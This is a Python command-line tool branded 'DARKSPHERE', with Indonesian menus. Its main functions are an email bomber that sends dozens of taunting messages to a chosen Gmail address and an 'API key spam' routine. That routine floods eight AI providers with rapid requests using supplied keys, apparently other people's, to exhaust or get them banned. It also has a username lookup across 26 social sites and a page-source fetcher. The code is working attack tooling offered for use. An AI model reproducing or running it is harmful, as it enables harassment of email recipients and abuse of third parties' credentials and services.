import os
import sys
import time
import random
import requests
import smtplib
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# ============================================================
# WARNA
# ============================================================
R = '\033[91m'
B = '\033[1m'
W = '\033[0m'
G = '\033[92m'
C = '\033[96m'
Y = '\033[93m'

# ============================================================
# KONFIGURASI (LOAD DARI FILE)
# ============================================================
CONFIG_FILE = "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

config = load_config()

# Ambil dari config, kalo gak ada pake default kosong
EMAIL_SENDER = config.get("email", {}).get("sender", "")
EMAIL_PASS = config.get("email", {}).get("app_password", "")
SMTP_SERVER = config.get("email", {}).get("smtp_server", "smtp.gmail.com")
SMTP_PORT = config.get("email", {}).get("smtp_port", 587)

# ============================================================
# KONFIGURASI API SPAM
# ============================================================
API_CONFIG = {
    "delay": 0.01,
    "max_requests_per_key": 100,
    "targets": [
        {"name": "Groq", "url": "https://api.groq.com/openai/v1/chat/completions", "model": "llama-3.3-70b-versatile"},
        {"name": "OpenAI", "url": "https://api.openai.com/v1/chat/completions", "model": "gpt-3.5-turbo"},
        {"name": "Gemini", "url": "https://generativelanguage.googleapis.com/v1/models/gemini-pro:generateContent"},
        {"name": "Claude", "url": "https://api.anthropic.com/v1/messages", "model": "claude-3-haiku-20240307"},
        {"name": "Mistral", "url": "https://api.mistral.ai/v1/chat/completions", "model": "mistral-small-latest"},
        {"name": "Cohere", "url": "https://api.cohere.ai/v1/generate", "model": "command"},
        {"name": "DeepSeek", "url": "https://api.deepseek.com/v1/chat/completions", "model": "deepseek-chat"},
        {"name": "HuggingFace", "url": "https://api-inference.huggingface.co/models/mistralai/Mistral-7B-Instruct-v0.1"},
    ]
}

# ============================================================
# DAFTAR PLATFORM SOSMED
# ============================================================
SOSMED_SITES = [
    {"name": "Instagram", "url": "https://www.instagram.com/{}"},
    {"name": "Twitter/X", "url": "https://twitter.com/{}"},
    {"name": "TikTok", "url": "https://www.tiktok.com/@{}"},
    {"name": "YouTube", "url": "https://www.youtube.com/@{}"},
    {"name": "GitHub", "url": "https://github.com/{}"},
    {"name": "Reddit", "url": "https://www.reddit.com/user/{}"},
    {"name": "Pinterest", "url": "https://www.pinterest.com/{}"},
    {"name": "Spotify", "url": "https://open.spotify.com/user/{}"},
    {"name": "Snapchat", "url": "https://www.snapchat.com/add/{}"},
    {"name": "Telegram", "url": "https://t.me/{}"},
    {"name": "Facebook", "url": "https://www.facebook.com/{}"},
    {"name": "LinkedIn", "url": "https://www.linkedin.com/in/{}"},
    {"name": "Twitch", "url": "https://www.twitch.tv/{}"},
    {"name": "Discord", "url": "https://discord.com/users/{}"},
    {"name": "Medium", "url": "https://medium.com/@{}"},
    {"name": "Dev.to", "url": "https://dev.to/{}"},
    {"name": "SoundCloud", "url": "https://soundcloud.com/{}"},
    {"name": "Vimeo", "url": "https://vimeo.com/{}"},
    {"name": "Flickr", "url": "https://www.flickr.com/people/{}"},
    {"name": "Tumblr", "url": "https://{}.tumblr.com"},
    {"name": "Patreon", "url": "https://www.patreon.com/{}"},
    {"name": "OnlyFans", "url": "https://onlyfans.com/{}"},
    {"name": "VK", "url": "https://vk.com/{}"},
    {"name": "WeChat", "url": "https://www.wechat.com/{}"},
    {"name": "Line", "url": "https://line.me/ti/p/{}"},
    {"name": "Signal", "url": "https://signal.me/#p/{}"},
]

# ============================================================
# FUNGSI CLEAR SCREEN
# ============================================================
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================================
# BANNER
# ============================================================
def banner():
    clear()
    print(f"""{R}{B}
╔════════════════════════════╗
║   {R}𝑫𝑨𝑹𝑲𝑺𝑷𝑯𝑬𝑹𝑬{C}{B}               ║
║   {Y}dev: {G}LEXZY{C}{B}               ║
╚════════════════════════════╝{W}
""")

# ============================================================
# ADD SENDER (TAMBAH EMAIL & APP PASSWORD)
# ============================================================
def add_sender():
    clear()
    banner()
    print(f"{R}[5] ADD SENDER{W}\n")

    email = input(f"{R}[?] Masukkan Email Sender : {W}").strip()
    if not email:
        print(f"{R}[x] Email tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    app_pass = input(f"{R}[?] Masukkan App Password : {W}").strip()
    if not app_pass:
        print(f"{R}[x] App Password tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    config["email"] = {
        "sender": email,
        "app_password": app_pass,
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    }
    save_config(config)

    global EMAIL_SENDER, EMAIL_PASS
    EMAIL_SENDER = email
    EMAIL_PASS = app_pass

    print(f"{G}[✓] Sender berhasil disimpan!{W}")
    print(f"{C}📧 Email: {email}{W}")
    print(f"{C}🔑 App Password: {app_pass[:4]}...{app_pass[-4:]}{W}")
    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SHOW SENDER
# ============================================================
def show_sender():
    clear()
    banner()
    print(f"{R}[6] SHOW SENDER{W}\n")

    if EMAIL_SENDER and EMAIL_PASS:
        print(f"{G}[✓] Sender aktif:{W}")
        print(f"{C}📧 Email: {EMAIL_SENDER}{W}")
        print(f"{C}🔑 App Password: {EMAIL_PASS[:4]}...{EMAIL_PASS[-4:]}{W}")
    else:
        print(f"{R}[x] Belum ada sender!{W}")
        print(f"{Y}Silakan tambahkan sender lewat menu [5] ADD SENDER{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SPAM EMAIL (PAKE SENDER DARI CONFIG)
# ============================================================
def spam_email():
    clear()
    banner()
    print(f"{R}[1] SPAM EMAIL{W}\n")

    if not EMAIL_SENDER or not EMAIL_PASS:
        print(f"{R}[x] Sender belum diatur!{W}")
        print(f"{Y}Silakan tambahkan sender lewat menu [5] ADD SENDER{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    username = input(f"{R}[?] Masukkan username email (contoh: bakolsempak) : {W}").strip()
    if not username:
        print(f"{R}[x] Username tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    target = username + "@gmail.com"

    count = input(f"{R}[?] Jumlah spam (default 50) : {W}").strip()
    count = int(count) if count else 50

    subject = "KENA SPAM YA😈?"
    body = "𝑫𝑨𝑹𝑲𝑺𝑷𝑯𝑬𝑹𝑬" * 5

    print(f"\n{R}[+] Mengirim {count} spam ke {target}...{W}")

    sys.stdout.write(f"{R}⏳ Proses spam...{W}")
    sys.stdout.flush()

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASS)

        for i in range(count):
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = target
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            server.send_message(msg)
            time.sleep(0.08)

        server.quit()
        sys.stdout.write("\r\033[K")
        print(f"{R}✅ Done spam to {target} 😈{W}")

    except Exception as e:
        sys.stdout.write("\r\033[K")
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SPAM API KEY AI (SAMA)
# ============================================================
def get_ai_reply(target_name, key):
    replies = [
        f"[!] API Key Anda ({key[:8]}...) terkena spam dari DARKSPHERE!",
        f"[!] Hubungi admin untuk reset key {target_name} Anda!",
        f"[!] - DARKSPHERE",
        f"[!] {target_name} API Key shutdown!!",
        f"[!] Spam detected! Your {target_name} key is now blacklisted.",
        f"[!] done spam api key",
        f"[!] {target_name} key: {key[:12]}... telah mencapai batas maksimum."
    ]
    return random.choice(replies)

def build_payload(target, key):
    payloads = {
        "Groq": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "OpenAI": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "Gemini": {"contents": [{"parts": [{"text": f"Spam test {time.time()}"}]}]},
        "Claude": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "max_tokens": 10},
        "Mistral": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "Cohere": {"model": target["model"], "prompt": f"Spam test {time.time()}", "max_tokens": 10},
        "DeepSeek": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "HuggingFace": {"inputs": f"Spam test {time.time()}"}
    }
    return payloads.get(target["name"], {})

def get_headers(target, key):
    headers = {
        "Groq": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "OpenAI": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "Gemini": {"x-goog-api-key": key, "Content-Type": "application/json"},
        "Claude": {"x-api-key": key, "Content-Type": "application/json", "anthropic-version": "2023-06-01"},
        "Mistral": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "Cohere": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "DeepSeek": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "HuggingFace": {"Authorization": f"Bearer {key}"}
    }
    return headers.get(target["name"], {})

def spam_api():
    clear()
    banner()
    print(f"{R}[2] SPAM APIKEY AI{W}\n")

    key_file = input(f"{R}[?] File keys.txt (enter untuk input manual) : {W}").strip()
    keys = []

    if key_file and os.path.exists(key_file):
        with open(key_file, "r") as f:
            keys = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    else:
        print(f"{R}\nMasukkan API Key satu per baris. Ketik 'done' untuk selesai:{W}")
        while True:
            line = input(f"{R}> {W}").strip()
            if line.lower() == "done":
                break
            if line:
                keys.append(line)

    if not keys:
        print(f"{R}[x] Tidak ada API Key!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] {len(keys)} API Key ditemukan. Memulai spam...{W}\n")

    for key in keys:
        for target in API_CONFIG["targets"]:
            print(f"{R}[{target['name']}] Spamming with key: {key[:8]}...{W}")
            for i in range(API_CONFIG["max_requests_per_key"]):
                try:
                    payload = build_payload(target, key)
                    headers = get_headers(target, key)
                    response = requests.post(target["url"], json=payload, headers=headers, timeout=5)
                    print(f"{R}[{target['name']}] Req {i+1}/{API_CONFIG['max_requests_per_key']} -> {response.status_code}{W}")

                    if response.status_code in [401, 403]:
                        print(f"{R}[{target['name']}] [x] API Key mati!{W}")
                        print(f"{R}[+] Balasan: {get_ai_reply(target['name'], key)}{W}\n")
                        break

                    if response.status_code != 200:
                        error_msg = response.json().get("error", {}).get("message", "Unknown")
                        print(f"{R}[{target['name']}] [!] Error: {error_msg}{W}")

                except Exception as e:
                    print(f"{R}[{target['name']}] [!] Error: {e}{W}")
                    if "401" in str(e) or "403" in str(e):
                        print(f"{R}[{target['name']}] [x] API Key mati!{W}")
                        break

                time.sleep(API_CONFIG["delay"])

    print(f"\n{R}[✓] Spam API selesai!{W}")
    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# OSINT - CARI AKUN SOSMED
# ============================================================
def osint_search():
    clear()
    banner()
    print(f"{R}[3] OSINT {W}\n")

    username = input(f"{R}[?] Masukkan username : {W}").strip()
    if not username:
        print(f"{R}[x] Username tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] Mencari akun dengan username '{username}' ...{W}\n")
    time.sleep(1)

    found = []
    not_found = []

    for site in SOSMED_SITES:
        url = site["url"].format(username)
        try:
            response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if response.status_code == 200:
                found.append({"name": site["name"], "url": url})
                print(f"{G}[✓] {site['name']} : {url}{W}")
            else:
                not_found.append(site["name"])
                print(f"{R}[✗] {site['name']} : Tidak ditemukan{W}")
        except Exception as e:
            not_found.append(site["name"])
            print(f"{R}[✗] {site['name']} : Error - {str(e)[:30]}{W}")

        time.sleep(0.3)

    print(f"\n{R}{B}═══════════════════════════════════════════{W}")
    print(f"{G}[✓] Ditemukan : {len(found)} akun{W}")
    print(f"{R}[✗] Tidak ditemukan : {len(not_found)} akun{W}")
    print(f"{R}{B}═══════════════════════════════════════════{W}\n")

    if found:
        print(f"{G}📋 Daftar Akun Ditemukan:{W}")
        for f in found:
            print(f"{C}  • {f['name']} : {f['url']}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# GET CODE HTML
# ============================================================
def get_code_html():
    clear()
    banner()
    print(f"{R}[4] GET CODE HTML{W}\n")

    url = input(f"{R}[?] Masukkan URL (contoh: https://example.com) : {W}").strip()
    if not url:
        print(f"{R}[x] URL tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] Mengambil source code dari {url} ...{W}\n")

    try:
        encoded_url = requests.utils.quote(url)
        api_url = f"https://api.synoxcloud.xyz/tools/getcodehtml?url={encoded_url}"
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == True:
                result = data.get("result", {})
                source_code = result.get("source", "Tidak ada source code")
                print(f"{G}✅ Status: {data.get('statusCode')}{W}")
                print(f"{G}✅ Creator: {data.get('creator')}{W}")
                print(f"{G}✅ Timestamp: {data.get('timestamp')}{W}")
                print(f"\n{C}{B}═══════════════════════════════════════════{W}")
                print(f"{G}📄 SOURCE CODE:{W}\n")
                print(f"{Y}{source_code}{W}")
                print(f"\n{C}{B}═══════════════════════════════════════════{W}")
            else:
                print(f"{R}[x] Gagal mengambil source code!{W}")
                print(f"{R}Response: {data}{W}")
        else:
            print(f"{R}[x] HTTP Error: {response.status_code}{W}")

    except requests.exceptions.Timeout:
        print(f"{R}[x] Timeout! Server tidak merespon.{W}")
    except Exception as e:
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# MAIN MENU
# ============================================================
def main():
    while True:
        clear()
        banner()
        print(f"{R}  [1] SPAM EMAIL")
        print(f"  [2] SPAM APIKEY AI")
        print(f"  [3] OSINT")
        print(f"  [4] GET CODE HTML")
        print(f"  [5] ADD SENDER")
        print(f"  [6] SHOW SENDER")
        print(f"  [7] EXIT{W}")
        print("")
        choice = input(f"{R}[?] Pilih menu: {W}").strip()

        if choice == "1":
            spam_email()
        elif choice == "2":
            spam_api()
        elif choice == "3":
            osint_search()
        elif choice == "4":
            get_code_html()
        elif choice == "5":
            add_sender()
        elif choice == "6":
            show_sender()
        elif choice == "7":
            print(f"{R}[+] Keluar...{W}")
            break
        else:
            print(f"{R}[x] Pilihan tidak valid!{W}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[x] Dibatalkan oleh user.{W}")